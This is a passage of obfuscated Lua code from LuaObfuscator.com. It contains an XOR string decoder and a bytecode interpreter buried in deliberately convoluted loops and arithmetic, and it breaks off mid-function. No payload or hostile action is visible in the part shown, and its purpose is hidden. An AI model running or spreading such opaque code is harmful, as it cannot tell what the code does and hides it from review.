--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

do
	local v0;
	local v1;
	local v2;
	local v3;
	local v4;
	local v5;
	local v6;
	local v7;
	local v8;
	local v9;
	local v10;
	local v11;
	local v12;
	local v13;
	local v14;
	local v15;
	local v16;
	local v17;
	local v18;
	local v19;
	local v20;
	local v21;
	local v22;
	local v23;
	local v24 = 0;
	while true do
		if (v24 == 2) then
			v7 = function(v25, v26)
				local v35 = 0;
				local v36;
				while true do
					if (v35 == 1) then
						return v5(v36);
					end
					if (v35 == 0) then
						v36 = {};
						for v51 = 1, #v25 do
							v6(v36, v0(v4(v1(v2(v25, v51, v51 + 1)), v1(v2(v26, 1 + ((v51 - 1) % #v26), 1 + ((v51 - 1) % #v26) + 1))) % 256));
						end
						v35 = 1;
					end
				end
			end;
			v8 = _G[v7("\47\6\52\175\230\82\33\41", "\91\105\90\218\139\48\68")];
			v9 = _G[v7("\189\16\66\69\160\3", "\206\100\48\44")][v7("\22\96\109\119", "\116\25\25\18\79\68")];
			v10 = _G[v7("\92\149\88\241\123\72", "\47\225\42\152\21")][v7("\221\223\168\14", "\190\183\201\124\107\61\47")];
			v24 = 3;
		end
		if (v24 == 5) then
			v19 = _G[v7("\18\221\205\115\250", "\98\190\172\31\150\151\230\61")];
			v20 = _G[v7("\164\238\163\195\207\216", "\215\139\207\166\172\172\164")];
			v21 = _G[v7("\169\196\16\54\177\174", "\220\170\96\87\210\197\96")] or _G[v7("\209\254\25\72\200", "\165\159\123\36\173\213")][v7("\80\4\198\78\37\63", "\37\106\182\47\70\84")];
			v22 = _G[v7("\158\228\17\101\180\175\5\185", "\234\139\127\16\217\205\96\203")];
			v24 = 6;
		end
		if (v24 == 3) then
			v11 = _G[v7("\145\204\107\89\209\65", "\226\184\25\48\191\38\16")][v7("\34\169\46", "\81\220\76\167")];
			v12 = _G[v7("\1\215\68\95\243\87", "\114\163\54\54\157\48")][v7("\81\99\175\176", "\54\16\218\210\202\234\158\125")];
			v13 = _G[v7("\163\173\177\30\204\131", "\208\217\195\119\162\228")][v7("\165\93\83", "\215\56\35\106")];
			v14 = _G[v7("\212\162\6\192\134", "\160\195\100\172\227\35\206")][v7("\20\17\182\47\204\90", "\119\126\216\76\173\46\50\117")];
			v24 = 4;
		end
		if (v24 == 1) then
			v4 = v3.bxor;
			v5 = table.concat;
			v6 = table.insert;
			v7 = nil;
			v24 = 2;
		end
		if (v24 == 4) then
			v15 = _G[v7("\100\187\119\140\208", "\16\218\21\224\181\135")][v7("\64\219\87\205\83\240", "\41\181\36\168\33\132\91")];
			v16 = _G[v7("\23\4\26\214", "\122\101\110\190\192\230")][v7("\46\243\255\80\149", "\66\151\154\40\229\150\59\210")];
			v17 = _G[v7("\189\81\150\78\161\191\111", "\218\52\226\40\196\209\25\60")] or function()
				return _ENV;
			end;
			v18 = _G[v7("\192\119\240\205\82\45\210\102\229\194\91\60", "\179\18\132\160\55\89")];
			v24 = 5;
		end
		if (v24 == 6) then
			v23 = nil;
			v23 = function(v30, v31, ...)
				local v37 = 0;
				local v38;
				local v39;
				local v40;
				local v41;
				local v42;
				local v43;
				local v44;
				local v45;
				local v46;
				local v47;
				local v48;
				local v49;
				local v50;
				while true do
					if (v37 == 1) then
						v42 = nil;
						v43 = nil;
						v44 = nil;
						v45 = nil;
						v37 = 2;
					end
					if (v37 == 0) then
						v38 = 0;
						v39 = nil;
						v40 = nil;
						v41 = nil;
						v37 = 1;
					end
					if (2 == v37) then
						v46 = nil;
						v47 = nil;
						v48 = nil;
						v49 = nil;
						v37 = 3;
					end
					if (v37 == 3) then
						v50 = nil;
						while true do
							local v52 = 0;
							while true do
								if (v52 == 1) then
									if (v38 == 0) then
										local v53 = 0;
										while true do
											if (v53 == 0) then
												v39 = 1 + 0;
												v40 = nil;
												v53 = 1;
											end
											if (1 == v53) then
												v30 = v12(v11(v30, 714 - ((1089 - (27 + 502)) + 149)), v7("\22\136", "\56\166\23\194"), function(v61)
													if (v9(v61, 2 + 0) == (219 - 140)) then
														local v107 = 0;
														local v108;
														while true do
															if (v107 == 0) then
																v108 = 0;
																while true do
																	if (v108 == 0) then
																		local v125 = 0;
																		while true do
																			if (v125 == 0) then
																				v40 = v8(v11(v61, 1 + 0, 1192 - (996 + 195)));
																				return "";
																			end
																		end
																	end
																end
																break;
															end
														end
													else
														local v109 = 0;
														local v110;
														local v111;
														while true do
															if (v109 == 1) then
																while true do
																	if (v110 == 0) then
																		v111 = v10(v8(v61, 16));
																		if v40 then
																			local v143 = 0;
																			local v144;
																			local v145;
																			while true do
																				if (v143 == 1) then
																					while true do
																						local v172 = 0;
																						while true do
																							if (v172 == 0) then
																								if (v144 == 1) then
																									return v145;
																								end
																								if (v144 == 0) then
																									local v177 = 0;
																									while true do
																										if (v177 == 0) then
																											v145 = v13(v111, v40);
																											v40 = nil;
																											v177 = 1;
																										end
																										if (v177 == 1) then
																											v144 = 1;
																											break;
																										end
																									end
																								end
																								break;
																							end
																						end
																					end
																					break;
																				end
																				if (v143 == 0) then
																					v144 = 0;
																					v145 = nil;
																					v143 = 1;
																				end
																			end
																		else
																			return v111;
																		end
																		break;
																	end
																end
																break;
															end
															if (v109 == 0) then
																v110 = 0;
																v111 = nil;
																v109 = 1;
															end
														end
													end
												end);
												v38 = 1;
												break;
											end
										end
									end
									if (1 == v38) then
										local v54 = 0;
										while true do
											if (v54 == 0) then
												v41 = nil;
												v41 = function(v62, v63, v64)
													if v64 then
														local v112 = 0;
														local v113;
														local v114;
														while true do
															if (v112 == 1) then
																while true do
																	if (v113 == (0 - 0)) then
																		local v126 = 0;
																		while true do
																			if (v126 == 0) then
																				v114 = (v62 / ((2 + 0) ^ (v63 - (1 + 0 + 0)))) % ((2 + 0) ^ (((v64 - (264 - (16 + 127 + 120))) - (v63 - (((2233 - (398 + 270)) - (377 + 1187)) + (570 - (109 + 461))))) + 1));
																				return v114 - (v114 % (1 + 0 + 0));
																			end
																		end
																	end
																end
																break;
															end
															if (v112 == 0) then
																v113 = 0 - 0;
																v114 = nil;
																v112 = 1;
															end
														end
													else
														local v115 = 0;
														local v116;
														local v117;
														while true do
															if (v115 == 1) then
																while true do
																	if (v116 == (0 - 0)) then
																		local v127 = 0;
																		while true do
																			if (v127 == 0) then
																				v117 = 2 ^ (v63 - (2 - (2 - 1)));
																				return (((v62 % (v117 + v117)) >= v117) and ((6 - (1296 - (1010 + 282))) - (1 + 0 + 0))) or (0 - 0);
																			end
																		end
																	end
																end
																break;
															end
															if (v115 == 0) then
																v116 = 0;
																v117 = nil;
																v115 = 1;
															end
														end
													end
												end;
												v54 = 1;
											end
											if (v54 == 1) then
												v42 = nil;
												v38 = 2;
												break;
											end
										end
									end
									v52 = 2;
								end
								if (v52 == 0) then
									if (v38 == 3) then
										local v55 = 0;
										while true do
											if (v55 == 0) then
												v44 = nil;
												v44 = function()
													local v69 = 0;
													local v70;
													local v71;
													local v72;
													local v73;
													local v74;
													while true do
														if (0 == v69) then
															v70 = 0 + 0;
															v71 = nil;
															v69 = 1;
														end
														if (v69 == 2) then
															v74 = nil;
															while true do
																local v118 = 0;
																while true do
																	if (0 == v118) then
																		if (1 == v70) then
																			return (v74 * ((46862095 - 30084280) - (556 + (53 - 10)))) + (v73 * ((45143 - 28062) + 9054 + 39401)) + (v72 * (515 - (33 + 226))) + v71;
																		end
																		if (v70 == 0) then
																			local v128 = 0;
																			while true do
																				if (v128 == 0) then
																					v71, v72, v73, v74 = v9(v30, v39, v39 + (6 - 3));
																					v39 = v39 + 4;
																					v128 = 1;
																				end
																				if (v128 == 1) then
																					v70 = 1;
																					break;
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
														if (1 == v69) then
															v72 = nil;
															v73 = nil;
															v69 = 2;
														end
													end
												end;
												v55 = 1;
											end
											if (1 == v55) then
												v45 = nil;
												v38 = 4;
												break;
											end
										end
									end
									if (v38 == 7) then
										local v56 = 0;
										while true do
											if (v56 == 0) then
												v50 = function(v65, v66, v67)
													local v75 = 0;
													local v76;
													local v77;
													local v78;
													local v79;
													while true do
														if (v75 == 1) then
															v78 = nil;
															v79 = nil;
															v75 = 2;
														end
														if (v75 == 2) then
															while true do
																local v119 = 0;
																while true do
																	if (v119 == 0) then
																		if (v76 == 1) then
																			local v129 = 0;
																			while true do
																				if (v129 == 0) then
																					v79 = v65[3];
																					return function(...)
																						local v150 = 0;
																						local v151;
																						local v152;
																						local v153;
																						local v154;
																						local v155;
																						local v156;
																						while true do
																							if (v150 == 1) then
																								v153 = nil;
																								v154 = nil;
																								v150 = 2;
																							end
																							if (v150 == 2) then
																								v155 = nil;
																								v156 = nil;
																								v150 = 3;
																							end
																							if (v150 == 3) then
																								while true do
																									if (v151 == 0) then
																										local v178 = 0;
																										while true do
																											if (v178 == 1) then
																												v151 = 1;
																												break;
																											end
																											if (v178 == 0) then
																												v152 = 1081 - (502 + 578);
																												v153 = -(1616 - (181 + 1434));
																												v178 = 1;
																											end
																										end
																									end
																									if (v151 == 3) then
																										_G['A'], _G['B'] = v48(v19(v156));
																										if not _G['A'][1 + 0] then
																											local v183 = 0;
																											local v184;
																											local v185;
																											while true do
																												if (v183 == 0) then
																													v184 = 0;
																													v185 = nil;
																													v183 = 1;
																												end
																												if (v183 == 1) then
																													while true do
																														if (v184 == 0) then
																															v185 = v65[4][v152] or "?";
																															error(v7("\244\182\87\188\198\93\49\194\167\87\186\196\9\112\211\245\126", "\167\213\37\213\182\41\17") .. v185 .. v7("\152\35", "\197\25\123\172\28") .. _G['A'][2 - 0]);
																															break;
																														end
																													end
																													break;
																												end
																											end
																										else
																											return v21(_G['A'], 802 - (527 + 273), _G['B']);
																										end
																										break;
																									end
																									if (v151 == 1) then
																										local v179 = 0;
																										while true do
																											if (v179 == 0) then
																												v154 = {...};
																												v155 = v20("#", ...) - ((741 + 781) - (613 + 908));
																												v179 = 1;
																											end
																											if (v179 == 1) then
																												v151 = 2;
																												break;
																											end
																										end
																									end
																									if (v151 == 2) then
																										local v180 = 0;
																										while true do
																											if (v180 == 0) then
																												v156 = nil;
																												v156 = function()
																													local v191 = 0;
																													local v192;
																													local v193;
																													local v194;
																													local v195;
																													local v196;
																													local v197;
																													local v198;
																													local v199;
																													local v200;
																													local v201;
																													while true do
																														if (v191 == 2) then
																															v199 = (v155 - v194) + 1 + 0;
																															v200 = nil;
																															v201 = nil;
																															while true do
																																local v202 = 0;
																																local v203;
																																while true do
																																	if (v202 == 0) then
																																		v203 = 0;
																																		while true do
																																			if (v203 == 1) then
																																				if (v201 <= 16) then
																																					if (v201 <= 7) then
																																						if (v201 <= (1 + 2)) then
																																							if (v201 <= (796 - (455 + 340))) then
																																								if (v201 == 0) then
																																									for v287 = v200[4 - 2], v200[3] do
																																										v198[v287] = nil;
																																									end
																																								else
																																									v198[v200[2]] = v198[v200[3]][v198[v200[4]]];
																																								end
																																							elseif (v201 == 2) then
																																								v152 = v200[(167 + 1221) - (127 + 1034 + (470 - 246))];
																																							else
																																								v198[v200[713 - (224 + 487)]][v198[v200[3]]] = v198[v200[1 + 3]];
																																							end
																																						elseif (v201 <= (324 - (56 + 263))) then
																																							if (v201 == 4) then
																																								local v235 = 0;
																																								local v236;
																																								local v237;
																																								while true do
																																									if (v235 == 0) then
																																										v236 = 0;
																																										v237 = nil;
																																										v235 = 1;
																																									end
																																									if (v235 == 1) then
																																										while true do
																																											if (0 == v236) then
																																												v237 = v200[2];
																																												v198[v237] = v198[v237](v21(v198, v237 + 1, v200[1547 - (950 + 594)]));
																																												break;
																																											end
																																										end
																																										break;
																																									end
																																								end
																																							else
																																								do
																																									return;
																																								end
																																							end
																																						elseif (v201 == (9 - 3)) then
																																							local v238 = 0;
																																							local v239;
																																							local v240;
																																							while true do
																																								if (v238 == 1) then
																																									while true do
																																										if (v239 == 0) then
																																											v240 = v200[1 + 1];
																																											v198[v240](v21(v198, v240 + 1, v153));
																																											break;
																																										end
																																									end
																																									break;
																																								end
																																								if (v238 == 0) then
																																									v239 = 0;
																																									v240 = nil;
																																									v238 = 1;
																																								end
																																							end
																																						else
																																							v198[v200[643 - (94 + 547)]] = #v198[v200[1672 - (53 + 1616)]];
																																						end
																																					elseif (v201 <= 11) then
																																						if (v201 <= 9) then
																																							if (v201 == 8) then
																																								v67[v200[11 - 8]] = v198[v200[2]];
																																							else
																																								local v244 = 0;
																																								local v245;
																																								local v246;
																																								local v247;
																																								local v248;
																																								while true do
																																									if (v244 == 2) then
																																										while true do
																																											if (v245 == 1) then
																																												local v317 = 0;
																																												while true do
																																													if (0 == v317) then
																																														v248 = {};
																																														v247 = v18({}, {[v7("\225\129\86\235\7\219\166", "\190\222\63\133\99")]=function(v345, v346)
																																															local v363 = 0;
																																															local v364;
																																															local v365;
																																															while true do
																																																if (v363 == 1) then
																																																	while true do
																																																		if (v364 == 0) then
																																																			local v389 = 0;
																																																			while true do
																																																				if (v389 == 0) then
																																																					v365 = v248[v346];
																																																					return v365[278 - (215 + 62)][v365[862 - ((1625 - (537 + 241)) + 13)]];
																																																				end
																																																			end
																																																		end
																																																	end
																																																	break;
																																																end
																																																if (0 == v363) then
																																																	v364 = 0;
																																																	v365 = nil;
																																																	v363 = 1;
																																																end
																																															end
																																														end,[v7("\152\106\119\112\206\210\165\163\162\77", "\199\53\25\21\185\187\203\199")]=function(v345, v346, v347)
																																															local v366 = 0;
																																															local v367;
																																															local v368;
																																															while true do
																																																if (v366 == 0) then
																																																	v367 = 0;
																																																	v368 = nil;
																																																	v366 = 1;
																																																end
																																																if (1 == v366) then
																																																	while true do
																																																		if (v367 == 0) then
																																																			v368 = v248[v346];
																																																			v368[1][v368[2]] = v347;
																																																			break;
																																																		end
																																																	end
																																																	break;
																																																end
																																															end
																																														end});
																																														v317 = 1;
																																													end
																																													if (v317 == 1) then
																																														v245 = 2;
																																														break;
																																													end
																																												end
																																											end
																																											if (0 == v245) then
																																												local v318 = 0;
																																												while true do
																																													if (v318 == 1) then
																																														v245 = 1;
																																														break;
																																													end
																																													if (v318 == 0) then
																																														v246 = v193[v200[(2667 - 940) - (246 + 337 + 77 + 1064)]];
																																														v247 = nil;
																																														v318 = 1;
																																													end
																																												end
																																											end
																																											if (v245 == 2) then
																																												for v333 = 1 + 0, v200[4] do
																																													local v334 = 0;
																																													local v335;
																																													local v336;
																																													while true do
																																														if (v334 == 0) then
																																															v335 = 0;
																																															v336 = nil;
																																															v334 = 1;
																																														end
																																														if (v334 == 1) then
																																															while true do
																																																if (v335 == 0) then
																																																	local v379 = 0;
																																																	while true do
																																																		if (0 == v379) then
																																																			v152 = v152 + 1;
																																																			v336 = v192[v152];
																																																			v379 = 1;
																																																		end
																																																		if (1 == v379) then
																																																			v335 = 1;
																																																			break;
																																																		end
																																																	end
																																																end
																																																if (v335 == 1) then
																																																	if (v336[(1 - 0) + 0] == (17 + 7)) then
																																																		v248[v333 - 1] = {v198,v336[3]};
																																																	else
																																																		v248[v333 - (1 - 0)] = {v66,v336[3]};
																																																	end
																																																	v197[#v197 + 1 + 0] = v248;
																																																	break;
																																																end
																																															end
																																															break;
																																														end
																																													end
																																												end
																																												v198[v200[2]] = v50(v246, v247, v67);
																																												break;
																																											end
																																										end
																																										break;
																																									end
																																									if (1 == v244) then
																																										v247 = nil;
																																										v248 = nil;
																																										v244 = 2;
																																									end
																																									if (v244 == 0) then
																																										v245 = 0;
																																										v246 = nil;
																																										v244 = 1;
																																									end
																																								end
																																							end
																																						elseif (v201 > (4 + 6)) then
																																							local v249 = 0;
																																							local v250;
																																							local v251;
																																							local v252;
																																							local v253;
																																							while true do
																																								if (v249 == 0) then
																																									v250 = 0;
																																									v251 = nil;
																																									v249 = 1;
																																								end
																																								if (v249 == 1) then
																																									v252 = nil;
																																									v253 = nil;
																																									v249 = 2;
																																								end
																																								if (v249 == 2) then
																																									while true do
																																										if (v250 == 2) then
																																											if (v252 > (0 - (254 - (234 + 20)))) then
																																												if (v253 <= v198[v251 + (832 - (270 + 561)) + (452 - (61 + 391))]) then
																																													local v369 = 0;
																																													local v370;
																																													while true do
																																														if (v369 == 0) then
																																															v370 = 0;
																																															while true do
																																																if (v370 == 0) then
																																																	v152 = v200[19 - (11 + 5)];
																																																	v198[v251 + 3] = v253;
																																																	break;
																																																end
																																															end
																																															break;
																																														end
																																													end
																																												end
																																											elseif (v253 >= v198[v251 + (2 - 1)]) then
																																												local v371 = 0;
																																												local v372;
																																												while true do
																																													if (v371 == 0) then
																																														v372 = 0;
																																														while true do
																																															if (v372 == 0) then
																																																v152 = v200[899 - (347 + 549)];
																																																v198[v251 + ((1589 - 861) - (183 + 329 + 213))] = v253;
																																																break;
																																															end
																																														end
																																														break;
																																													end
																																												end
																																											end
																																											break;
																																										end
																																										if (v250 == 0) then
																																											local v320 = 0;
																																											while true do
																																												if (v320 == 1) then
																																													v250 = 1;
																																													break;
																																												end
																																												if (0 == v320) then
																																													v251 = v200[(990 + 800) - (238 + 939 + 611)];
																																													v252 = v198[v251 + 2 + 0];
																																													v320 = 1;
																																												end
																																											end
																																										end
																																										if (v250 == 1) then
																																											local v321 = 0;
																																											while true do
																																												if (v321 == 1) then
																																													v250 = 2;
																																													break;
																																												end
																																												if (v321 == 0) then
																																													v253 = v198[v251] + v252;
																																													v198[v251] = v253;
																																													v321 = 1;
																																												end
																																											end
																																										end
																																									end
																																									break;
																																								end
																																							end
																																						else
																																							v198[v200[2]] = v198[v200[3]] % v200[3 + 1 + 0];
																																						end
																																					elseif (v201 <= (694 - (360 + 142 + 179))) then
																																						if (v201 == ((482 + 260) - ((478 - (127 + 99)) + 478))) then
																																							local v255 = 0;
																																							local v256;
																																							local v257;
																																							local v258;
																																							local v259;
																																							local v260;
																																							while true do
																																								if (v255 == 0) then
																																									v256 = 0;
																																									v257 = nil;
																																									v255 = 1;
																																								end
																																								if (v255 == 2) then
																																									v260 = nil;
																																									while true do
																																										if (v256 == 1) then
																																											local v322 = 0;
																																											while true do
																																												if (v322 == 1) then
																																													v256 = 2;
																																													break;
																																												end
																																												if (v322 == 0) then
																																													v153 = (v259 + v257) - (1 + 0);
																																													v260 = 1399 - (9 + 1390);
																																													v322 = 1;
																																												end
																																											end
																																										end
																																										if (2 == v256) then
																																											for v337 = v257, v153 do
																																												local v338 = 0;
																																												local v339;
																																												while true do
																																													if (v338 == 0) then
																																														v339 = 0;
																																														while true do
																																															if (v339 == 0) then
																																																v260 = v260 + (1 - 0);
																																																v198[v337] = v258[v260];
																																																break;
																																															end
																																														end
																																														break;
																																													end
																																												end
																																											end
																																											break;
																																										end
																																										if (v256 == 0) then
																																											local v323 = 0;
																																											while true do
																																												if (v323 == 1) then
																																													v256 = 1;
																																													break;
																																												end
																																												if (v323 == 0) then
																																													v257 = v200[(4 - 2) + (0 - 0)];
																																													v258, v259 = v195(v198[v257](v21(v198, v257 + (2 - 1) + (0 - 0), v200[3])));
																																													v323 = 1;
																																												end
																																											end
																																										end
																																									end
																																									break;
																																								end
																																								if (v255 == 1) then
																																									v258 = nil;
																																									v259 = nil;
																																									v255 = 2;
																																								end
																																							end
																																						else
																																							v198[v200[5 - 3]] = {};
																																						end
																																					elseif (v201 <= 14) then
																																						if (v200[2 - 0] == v198[v200[(1409 - 859) - ((918 - (511 + 213)) + 352)]]) then
																																							v152 = v152 + (1593 - (1281 + 311));
																																						else
																																							v152 = v200[857 - (43 + 811)];
																																						end
																																					elseif (v201 > 15) then
																																						v198[v200[1 + 1]] = v66[v200[3]];
																																					else
																																						local v294 = 0;
																																						local v295;
																																						local v296;
																																						while true do
																																							if (v294 == 0) then
																																								v295 = 0;
																																								v296 = nil;
																																								v294 = 1;
																																							end
																																							if (v294 == 1) then
																																								while true do
																																									if (v295 == 0) then
																																										v296 = v200[1 + (1390 - (1003 + 386))];
																																										do
																																											return v21(v198, v296, v153);
																																										end
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					end
																																				elseif (v201 <= ((1196 + 683) - (709 + 1145))) then
																																					if (v201 <= ((11 - 4) + 13)) then
																																						if (v201 <= (1854 - (776 + 343 + 717))) then
																																							if (v201 > 17) then
																																								v198[v200[2]] = v198[v200[3]][v200[4]];
																																							else
																																								v198[v200[2 + 0]] = v67[v200[(7833 - 6093) - ((2324 - (178 + 1008)) + 599)]];
																																							end
																																						elseif (v201 == (65 - 46)) then
																																							if (v198[v200[(1 + 2) - 1]] == v200[(8322 - 6335) - (937 + (2447 - 1401))]) then
																																								v152 = v152 + 1;
																																							else
																																								v152 = v200[(3 + 1) - (1886 - (73 + 1812))];
																																							end
																																						else
																																							v198[v200[856 - ((1824 - (1120 + 438)) + (1426 - (815 + 23)))]] = v200[(1571 - (928 + 435)) - (81 + 110 + 14)] ~= 0;
																																						end
																																					elseif (v201 <= ((1532 - (829 + 5)) - (633 + 43))) then
																																						if (v201 > (3 + 18)) then
																																							local v267 = 0;
																																							local v268;
																																							local v269;
																																							while true do
																																								if (v267 == 0) then
																																									v268 = 0;
																																									v269 = nil;
																																									v267 = 1;
																																								end
																																								if (v267 == 1) then
																																									while true do
																																										if (v268 == 0) then
																																											v269 = v200[(1905 - (1220 + 683)) + 0];
																																											do
																																												return v198[v269](v21(v198, v269 + 1 + 0, v200[8 - (4 + 1)]));
																																											end
																																											break;
																																										end
																																									end
																																									break;
																																								end
																																							end
																																						else
																																							local v270 = 0;
																																							local v271;
																																							local v272;
																																							local v273;
																																							local v274;
																																							while true do
																																								if (v270 == 1) then
																																									v273 = nil;
																																									v274 = nil;
																																									v270 = 2;
																																								end
																																								if (v270 == 0) then
																																									v271 = 0;
																																									v272 = nil;
																																									v270 = 1;
																																								end
																																								if (v270 == 2) then
																																									while true do
																																										if (v271 == 1) then
																																											v274 = v198[v272 + (1556 - (1438 + 116))];
																																											if (v274 > 0) then
																																												if (v273 > v198[v272 + 1 + 0]) then
																																													v152 = v200[(1653 - (1611 + 29)) - (1566 - (83 + 1473))];
																																												else
																																													v198[v272 + ((2 + 9) - (7 + 1))] = v273;
																																												end
																																											elseif (v273 < v198[v272 + (1 - 0)]) then
																																												v152 = v200[3];
																																											else
																																												v198[v272 + (4 - (1668 - (1234 + 433)))] = v273;
																																											end
																																											break;
																																										end
																																										if (v271 == 0) then
																																											local v326 = 0;
																																											while true do
																																												if (v326 == 1) then
																																													v271 = 1;
																																													break;
																																												end
																																												if (v326 == 0) then
																																													v272 = v200[2];
																																													v273 = v198[v272];
																																													v326 = 1;
																																												end
																																											end
																																										end
																																									end
																																									break;
																																								end
																																							end
																																						end
																																					elseif (v201 <= 23) then
																																						v198[v200[2]]();
																																					elseif (v201 > (7 + 17)) then
																																						local v298 = 0;
																																						local v299;
																																						local v300;
																																						local v301;
																																						local v302;
																																						local v303;
																																						while true do
																																							if (v298 == 1) then
																																								v301 = nil;
																																								v302 = nil;
																																								v298 = 2;
																																							end
																																							if (v298 == 2) then
																																								v303 = nil;
																																								while true do
																																									if (v299 == 1) then
																																										local v341 = 0;
																																										while true do
																																											if (v341 == 1) then
																																												v299 = 2;
																																												break;
																																											end
																																											if (v341 == 0) then
																																												v153 = (v302 + v300) - 1;
																																												v303 = (0 + 0) - (1204 - (760 + 444));
																																												v341 = 1;
																																											end
																																										end
																																									end
																																									if (v299 == 2) then
																																										for v355 = v300, v153 do
																																											local v356 = 0;
																																											local v357;
																																											while true do
																																												if (v356 == 0) then
																																													v357 = 0;
																																													while true do
																																														if (v357 == 0) then
																																															v303 = v303 + 1;
																																															v198[v355] = v301[v303];
																																															break;
																																														end
																																													end
																																													break;
																																												end
																																											end
																																										end
																																										break;
																																									end
																																									if (v299 == 0) then
																																										local v342 = 0;
																																										while true do
																																											if (v342 == 1) then
																																												v299 = 1;
																																												break;
																																											end
																																											if (v342 == 0) then
																																												v300 = v200[2 + 0];
																																												v301, v302 = v195(v198[v300](v198[v300 + (2 - 1)]));
																																												v342 = 1;
																																											end
																																										end
																																									end
																																								end
																																								break;
																																							end
																																							if (v298 == 0) then
																																								v299 = 0;
																																								v300 = nil;
																																								v298 = 1;
																																							end
																																						end
																																					else
																																						v198[v200[2]] = v198[v200[3]];
																																					end
																																				elseif (v201 <= ((608 - (486 + 110)) + 8 + 9)) then
																																					if (v201 <= 27) then
																																						if (v201 > ((415 - (14 + 338)) - 37)) then
																																							v198[v200[1143 - (659 + 482)]] = v200[1 + 1 + 1];
																																						elseif not v198[v200[(1657 - (398 + 1256)) - (1 + 0)]] then
																																							v152 = v152 + 1;
																																						else
																																							v152 = v200[1941 - (711 + 1227)];
																																						end
																																					elseif (v201 > 28) then
																																						local v277 = 0;
																																						local v278;
																																						local v279;
																																						while true do
																																							if (v277 == 1) then
																																								while true do
																																									if (v278 == 0) then
																																										v279 = v200[2 + 0 + 0];
																																										v198[v279] = v198[v279](v21(v198, v279 + ((380 - 215) - (46 + 118)), v153));
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																							if (v277 == 0) then
																																								v278 = 0;
																																								v279 = nil;
																																								v277 = 1;
																																							end
																																						end
																																					else
																																						v198[v200[2]] = v198[v200[6 - 3]] % v198[v200[1 + 0 + 3 + 0]];
																																					end
																																				elseif (v201 <= 31) then
																																					if (v201 == ((1746 - (238 + 1410)) - (16 + 23 + 29))) then
																																						v198[v200[2]] = v200[1375 - ((16 - 8) + 1364)] + v198[v200[11 - 7]];
																																					else
																																						local v282 = 0;
																																						local v283;
																																						local v284;
																																						local v285;
																																						while true do
																																							if (0 == v282) then
																																								v283 = 0;
																																								v284 = nil;
																																								v282 = 1;
																																							end
																																							if (v282 == 1) then
																																								v285 = nil;
																																								while true do
																																									if (0 == v283) then
																																										local v329 = 0;
																																										while true do
																																											if (v329 == 1) then
																																												v283 = 1;
																																												break;
																																											end
																																											if (v329 == 0) then
																																												v284 = v200[2];
																																												v285 = v198[v200[2 + 1]];
																																												v329 = 1;
																																											end
																																										end
																																									end
																																									if (v283 == 1) then
																																										v198[v284 + ((2 - 1) - (0 - 0))] = v285;
																																										v198[v284] = v285[v200[4]];
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					end
																																				elseif (v201 <= (41 - (17 - 8))) then
																																					v198[v200[1 + 1 + 0]] = v198[v200[3]] + v200[4];
																																				elseif (v201 > 33) then
																																					v198[v200[(11 - 8) - (1 + 0)]] = v198[v200[(43 - (28 + 13)) + 1]] - v200[4];
																																				else
																																					local v308 = 0;
																																					local v309;
																																					local v310;
																																					local v311;
																																					local v312;
																																					local v313;
																																					while true do
																																						if (v308 == 0) then
																																							v309 = 0;
																																							v310 = nil;
																																							v308 = 1;
																																						end
																																						if (v308 == 2) then
																																							v313 = nil;
																																							while true do
																																								if (v309 == 1) then
																																									local v343 = 0;
																																									while true do
																																										if (v343 == 1) then
																																											v309 = 2;
																																											break;
																																										end
																																										if (v343 == 0) then
																																											v153 = (v312 + v310) - 1;
																																											v313 = 1924 - (57 + 1867);
																																											v343 = 1;
																																										end
																																									end
																																								end
																																								if (v309 == 2) then
																																									for v360 = v310, v153 do
																																										local v361 = 0;
																																										local v362;
																																										while true do
																																											if (v361 == 0) then
																																												v362 = 0;
																																												while true do
																																													if (v362 == 0) then
																																														v313 = v313 + ((11 - 7) - 3);
																																														v198[v360] = v311[v313];
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																									end
																																									break;
																																								end
																																								if (v309 == 0) then
																																									local v344 = 0;
																																									while true do
																																										if (v344 == 0) then
																																											v310 = v200[(1251 - (77 + 243)) - (118 + 68 + 743)];
																																											v311, v312 = v195(v198[v310](v21(v198, v310 + 1, v153)));
																																											v344 = 1;
																																										end
																																										if (v344 == 1) then
																																											v309 = 1;
																																											break;
																																										end
																																									end
																																								end
																																							end
																																							break;
																																						end
																																						if (v308 == 1) then
																																							v311 = nil;
																																							v312 = nil;
																																							v308 = 2;
																																						end
																																					end
																																				end
																																				v152 = v152 + 1;
																																				break;
																																			end
																																			if (v203 == 0) then
																																				local v221 = 0;
																																				while true do
																																					if (v221 == 1) then
																																						v203 = 1;
																																						break;
																																					end
																																					if (v221 == 0) then
																																						v200 = v192[v152];
																																						v201 = v200[1];
																																						v221 = 1;
																																					end
																																				end
																																			end
																																		end
																																		break;
																																	end
																																end
																															end
																															break;
																														end
																														if (v191 == 0) then
																															v192 = v77;
																															v193 = v78;
																															v194 = v79;
																															v195 = v48;
																															v191 = 1;
																														end
																														if (v191 == 1) then
																															v196 = {};
																															v197 = {};
																															v198 = {};
																															for v204 = 0 - 0, v155 do
																																if (v204 >= v194) then
																																	v196[v204 - v194] = v154[v204 + 1];
																																else
																																	v198[v204] = v154[v204 + (2 - 1)];
																																end
																															end
																															v191 = 2;
																														end
																													end
																												end;
																												v180 = 1;
																											end
																											if (1 == v180) then
																												v151 = 3;
																												break;
																											end
																										end
																									end
																								end
																								break;
																							end
																							if (v150 == 0) then
																								v151 = 0;
																								v152 = nil;
																								v150 = 1;
																							end
																						end
																					end;
																				end
																			end
																		end
																		if (v76 == 0) then
																			local v130 = 0;
																			while true do
																				if (1 == v130) then
																					v76 = 1;
																					break;
																				end
																				if (v130 == 0) then
																					v77 = v65[1];
																					v78 = v65[2 + 0];
																					v130 = 1;
																				end
																			end
																		end
																		break;
																	end
																end
															end
